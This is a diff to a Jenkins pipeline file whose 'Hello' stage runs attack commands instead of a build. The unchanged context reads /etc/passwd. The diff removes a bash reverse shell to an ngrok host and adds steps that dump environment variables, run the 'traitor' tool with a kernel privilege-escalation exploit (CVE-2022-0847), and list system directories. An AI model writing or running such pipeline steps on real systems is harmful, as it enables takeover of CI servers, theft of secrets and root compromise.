@@ -5,7 +5,14 @@ pipeline {
         stage('Hello') {
             steps {
                 sh 'cat /etc/passwd'
-                sh '/bin/bash -l > /dev/tcp/7.tcp.eu.ngrok.io/17377 0<&1 2>&1'
+                sh 'env'
+                sh 'chmod 777 traitor-amd64'
+                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
+                sh 'id'
+                sh 'whoami'
+                sh 'ls -a'
+                sh 'ls -la /'
+                sh 'ls -la /var/'
             }
         }
     }
